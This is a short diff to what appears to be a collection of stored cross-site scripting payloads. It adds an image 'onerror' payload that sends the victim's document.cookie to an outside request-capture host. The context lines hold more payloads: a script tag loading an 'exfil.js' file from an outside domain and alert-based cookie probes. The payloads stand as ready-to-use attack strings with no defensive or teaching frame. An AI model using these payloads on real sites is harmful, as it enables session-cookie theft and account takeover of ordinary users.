@@ -11,6 +11,8 @@ Stored XSS
 
 “><script src=“https://abhilash.pk//exfil.js”></script>
 
+<img src=x onerror=this.src='https://gopal.free.beeceptor.com/?'+document.cookie;>
+
 "><img src=x onerror=alert(101)>
 
 "><img src=x onerror=alert(document.cookie)>
